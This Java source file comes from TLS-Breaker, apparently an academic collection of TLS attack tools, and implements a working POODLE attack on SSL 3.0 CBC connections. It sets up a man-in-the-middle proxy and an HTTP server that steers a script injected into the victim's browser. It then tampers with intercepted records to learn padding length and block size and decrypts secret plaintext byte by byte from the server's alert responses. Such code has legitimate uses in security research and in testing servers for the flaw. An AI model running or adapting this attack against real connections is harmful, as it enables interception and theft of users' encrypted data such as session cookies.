/**
 * TLS-Breaker - A tool collection of various attacks on TLS based on TLS-Attacker
 *
 * Copyright 2021-2022 Ruhr University Bochum, Paderborn University, Hackmanit GmbH
 *
 * Licensed under Apache License, Version 2.0
 * http://www.apache.org/licenses/LICENSE-2.0.txt
 */

package de.rub.nds.tlsbreaker.poodle.impl;

import static de.rub.nds.tlsattacker.util.ConsoleLogger.CONSOLE;

import java.util.ArrayList;
import java.util.Arrays;
import java.util.LinkedList;
import java.util.List;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

import com.beust.jcommander.internal.Console;

import de.rub.nds.tlsattacker.core.config.Config;
import de.rub.nds.tlsattacker.core.constants.CipherSuite;
import de.rub.nds.tlsattacker.core.constants.HandshakeMessageType;
import de.rub.nds.tlsattacker.core.constants.ProtocolMessageType;
import de.rub.nds.tlsattacker.core.constants.ProtocolVersion;
import de.rub.nds.tlsattacker.core.constants.RunningModeType;
import de.rub.nds.tlsattacker.core.record.AbstractRecord;
import de.rub.nds.tlsattacker.core.record.parser.RecordParser;
import de.rub.nds.tlsattacker.core.state.State;
import de.rub.nds.tlsattacker.core.workflow.DefaultWorkflowExecutor;
import de.rub.nds.tlsattacker.core.workflow.WorkflowExecutor;
import de.rub.nds.tlsattacker.core.workflow.WorkflowExecutorFactory;
import de.rub.nds.tlsattacker.core.workflow.WorkflowTraceUtil;
import de.rub.nds.tlsattacker.core.workflow.action.executor.MessageActionResult;
import de.rub.nds.tlsattacker.core.workflow.action.executor.ReceiveMessageHelper;
import de.rub.nds.tlsattacker.core.workflow.action.executor.SendMessageHelper;
import de.rub.nds.tlsattacker.core.workflow.action.executor.WorkflowExecutorType;
import de.rub.nds.tlsattacker.core.workflow.factory.WorkflowTraceType;
import de.rub.nds.tlsbreaker.breakercommons.impl.Attacker;
import de.rub.nds.tlsbreaker.poodle.config.PoodleCommandConfig;
import de.rub.nds.tlsbreaker.poodle.util.MyHttpHandler;
import de.rub.nds.tlsbreaker.poodle.util.PoodleHTTPServer;
import de.rub.nds.tlsbreaker.poodle.util.PoodleUtils;

/**
 *
 */
public class PoodleAttacker extends Attacker<PoodleCommandConfig> {

    private static final Logger LOGGER = LogManager.getLogger();

    private MyHttpHandler httphandler;

    private String decryptedMessage = "";

    int i = 0;

    /**
     *
     * @param config
     * @param baseConfig
     */
    public PoodleAttacker(PoodleCommandConfig config, Config baseConfig) {
        super(config, baseConfig);

        // The http server that sends attack parameters to the script injected on the
        // client side
        httphandler = new MyHttpHandler();
        PoodleHTTPServer poodleHTTPServer = new PoodleHTTPServer(httphandler);
        poodleHTTPServer.startPoddleHTTPServer();
        CONSOLE.info(" Server started on port 8001");
    }

    @Override
    public void executeAttack() {

        // First part of the attack, finding the padding length and block size
        int foundBlockSize = findBlockSizeAndPaddingLength();

        // Second part of the attack, modify the messages and decrypt the byte
        // when the message is accepted by the server
        sendModifiedMessages(foundBlockSize);
    }

    /**
     * Finds block size and padding length. Note:Only block size is returned padding length is set as class parameter.
     *
     * @return the size of the block
     */
    public int findBlockSizeAndPaddingLength() {

        int paddingLength = 1;

        int startingMessageLength = 0;

        int messageLengthAfterChange = 0;

        boolean foundPaddingLength = false;

        startingMessageLength = receiveMessageWithLength();

        while (!foundPaddingLength) {

            int currentMessageLength = receiveMessageWithLength();
            if (currentMessageLength > startingMessageLength) {

                messageLengthAfterChange = currentMessageLength;
                CONSOLE.info("Padding length is: " + paddingLength);
                CONSOLE.info("Message length found. Now starting with the main part of the attack!");
                // Make padding length available to the http server
                httphandler.paddingSize = paddingLength;
                foundPaddingLength = true;
            } else {
                paddingLength++;
            }

            if (foundPaddingLength) {
                httphandler.paddingfound = true;
                break;
            }
        }
        CONSOLE.info("Block size found: " + (messageLengthAfterChange - startingMessageLength));
        return messageLengthAfterChange - startingMessageLength;
    }

    public int receiveMessageWithLength() {

        int messageLengthReceived = 0;

        Config conf1 = config.createConfig();
        conf1.setWorkflowTraceType(WorkflowTraceType.SIMPLE_FORWARDING_MITM_PROXY);
        conf1.setDefaultRunningMode(RunningModeType.MITM);
        conf1.setWorkflowExecutorShouldClose(false);

        State state1 = new State(conf1);

        WorkflowExecutor workflowExecutor1 =
            WorkflowExecutorFactory.createWorkflowExecutor(WorkflowExecutorType.DEFAULT, state1);
        workflowExecutor1.executeWorkflow();

        ReceiveMessageHelper receiveMessageHelper1 = new ReceiveMessageHelper();

        try {
            MessageActionResult mar = receiveMessageHelper1.receiveMessages(state1.getInboundTlsContexts().get(0));

            if (mar.getMessageList().size() != 0) {

                CONSOLE.info("The size of the message is:"
                    + mar.getMessageList().get(0).getCompleteResultingMessage().getValue().length);

                messageLengthReceived = mar.getMessageList().get(0).getCompleteResultingMessage().getValue().length;

                state1.getInboundTlsContexts().get(0).getTransportHandler().closeConnection();
                state1.getOutboundTlsContexts().get(0).getTransportHandler().closeConnection();

                return messageLengthReceived;
            }

        } catch (Exception e) {
            CONSOLE.info("No data was sent!");
            e.printStackTrace();
        }
        return messageLengthReceived;
    }

    // Second Part of the attack: Modify messages and send to server
    public void sendModifiedMessages(int block_size) {

        // Message type, version and length
        int message_offset = 5;

        int decryptedBytesSoFar = 0;

        int positionOfBlockToDecrypt = 1;

        while (positionOfBlockToDecrypt < 4) {
            i++;
            CONSOLE.info("Iteration: " + i + "     " + "Decrypted message so far: " + decryptedMessage);
            Config conf = config.createConfig();
            conf.setWorkflowTraceType(WorkflowTraceType.SIMPLE_FORWARDING_MITM_PROXY);
            conf.setDefaultRunningMode(RunningModeType.MITM);
            conf.setWorkflowExecutorShouldClose(false);

            State state = new State(conf);

            WorkflowExecutor workflowExecutor =
                WorkflowExecutorFactory.createWorkflowExecutor(WorkflowExecutorType.DEFAULT, state);
            workflowExecutor.executeWorkflow();

            // state.getInboundTlsContexts().get(0).

            ReceiveMessageHelper receiveMessageHelper = new ReceiveMessageHelper();
            SendMessageHelper sendMessageHelper = new SendMessageHelper();

            try {

                PoodleUtils poodleUtils = new PoodleUtils();

                MessageActionResult mar = receiveMessageHelper.receiveMessages(state.getInboundTlsContexts().get(0));

                if (mar.getMessageList().size() != 0) {

                    // This is currently a protection mechanism that does not try to make sense of
                    // unwanted messages
                    if (mar.getRecordList().get(1).getContentMessageType() != ProtocolMessageType.APPLICATION_DATA) {
                        state.getInboundTlsContexts().get(0).getTransportHandler().closeConnection();
                        state.getOutboundTlsContexts().get(0).getTransportHandler().closeConnection();
                        continue;
                    }

                    CONSOLE.info("====================BEFORE MODIFICATION=================================");
                    CONSOLE.info(mar.getRecordList().get(0).getCompleteRecordBytes());
                    CONSOLE.info("------------------------------------------------------------------------");
                    CONSOLE.info(mar.getRecordList().get(1).getCompleteRecordBytes());
                    CONSOLE.info("========================================================================");

                    // Modify the byte, putt a block as padding, skip 5 first bytes plus the first
                    // block.
                    byte[] modified_bytes = poodleUtils.replacePaddingWithBlock(
                        mar.getRecordList().get(1).getCompleteRecordBytes().getValue(), block_size,
                        message_offset + (block_size * positionOfBlockToDecrypt));

                    AbstractRecord modified_record = mar.getRecordList().get(1);

                    modified_record.setCompleteRecordBytes(modified_bytes);

                    RecordParser recordParser = new RecordParser(0, modified_bytes, ProtocolVersion.SSL3);

                    AbstractRecord record = recordParser.parse();

                    List<AbstractRecord> modified_record_list = new ArrayList<>();
                    modified_record_list.add(0, mar.getRecordList().get(0));
                    modified_record_list.add(1, record);

                    CONSOLE.info("=====================AFTER MODIFICATION=================================");
                    CONSOLE.info(modified_record_list.get(0).getCompleteRecordBytes());
                    CONSOLE.info("------------------------------------------------------------------------");
                    CONSOLE.info(modified_record_list.get(1).getCompleteRecordBytes());
                    CONSOLE.info("========================================================================");

                    sendMessageHelper.sendRecords(modified_record_list, state.getOutboundTlsContexts().get(0));

                    MessageActionResult mar2 =
                        receiveMessageHelper.receiveMessages(state.getOutboundTlsContexts().get(0));

                    if (mar2.getMessageList().size() == 0) {

                        httphandler.bytedecrypted = true;

                        decryptedBytesSoFar++;

                        i = 0;

                        CONSOLE.info("Server sent no alert! Modified Message was accepted  ");

                        // Get the block before the message block we are going to decrypt
                        byte[] block_before_message = Arrays.copyOfRange(modified_bytes,
                            message_offset + (block_size * (positionOfBlockToDecrypt - 1)),
                            message_offset + (block_size * positionOfBlockToDecrypt));

                        // Gets the block that is positioned before the padding block
                        byte[] block_before_padding = Arrays.copyOfRange(modified_bytes,
                            modified_bytes.length - 2 * block_size, modified_bytes.length - block_size);

                        byte found_byte;

                        if (block_size == 8) {
                            found_byte = (byte) (block_before_message[7] ^ block_before_padding[7] ^ 0x07);
                        } else {
                            found_byte = (byte) (block_before_message[15] ^ block_before_padding[15] ^ 0xF);
                        }

                        // If we decrypted the full block then move to the next block
                        if (decryptedBytesSoFar == block_size) {
                            positionOfBlockToDecrypt++;
                            decryptedBytesSoFar = 0;
                            httphandler.block_decrypted = true;

                        }

                        // I put it in a byte array to convert it easier to string, there has to be a
                        // better way
                        byte[] decrypted_string = { found_byte };

                        CONSOLE.info("========================================================================");

                        CONSOLE.info("Decrypted byte is: " + new String(decrypted_string));

                        decryptedMessage = new String(decrypted_string) + decryptedMessage;

                        CONSOLE.info("========================================================================");

                    } else {
                        CONSOLE.info(
                            "Alert found! Server did not accept the modified message. Continuing with the next attempt.");
                    }

                    state.getInboundTlsContexts().get(0).getTransportHandler().closeConnection();
                    state.getOutboundTlsContexts().get(0).getTransportHandler().closeConnection();

                }

            } catch (Exception e) {
                System.out.println("No data yet");
                e.printStackTrace();
            }
        }
    }

    /**
     *
     * @return
     */
    @Override
    public Boolean isVulnerable() {
        Config tlsConfig = getTlsConfig();
        tlsConfig.setDefaultRunningMode(RunningModeType.CLIENT);
        tlsConfig.setHighestProtocolVersion(ProtocolVersion.SSL3);
        tlsConfig.setDefaultClientSupportedCipherSuites(getCbcCiphers());
        tlsConfig.setWorkflowTraceType(WorkflowTraceType.HELLO);
        State state = new State(tlsConfig);
        DefaultWorkflowExecutor executor = new DefaultWorkflowExecutor(state);
        executor.executeWorkflow();
        return WorkflowTraceUtil.didReceiveMessage(HandshakeMessageType.SERVER_HELLO, state.getWorkflowTrace());
    }

    private List<CipherSuite> getCbcCiphers() {
        List<CipherSuite> cbcs = new LinkedList<>();
        for (CipherSuite suite : CipherSuite.getImplemented()) {
            if (suite.isCBC()) {
                cbcs.add(suite);
            }
        }
        return cbcs;
    }
}
